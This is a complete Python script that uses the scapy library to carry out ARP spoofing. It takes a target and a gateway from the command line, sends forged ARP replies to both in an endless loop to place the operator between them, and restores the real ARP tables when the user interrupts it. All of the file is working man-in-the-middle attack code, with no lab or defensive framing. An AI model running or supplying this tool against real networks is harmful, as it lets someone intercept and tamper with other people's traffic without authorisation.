#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="target machine")
    parser.add_option("-g", "--gateway", dest="gateway", help="gateway machine")
    (options, arguments) = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

option = get_arguments()
target_device = option.target
gateway_device = option.gateway
packet_sent = 0

try:
    while True:
        spoof(gateway_device, target_device)
        spoof(target_device, gateway_device)
        packet_sent = packet_sent + 2
        print("\rPacket Sent:", packet_sent, end=" ")
        time.sleep(2)
except KeyboardInterrupt:
    restore(gateway_device, target_device)
    restore(target_device, gateway_device)
    print("\nCtrl+C Program has been terminated")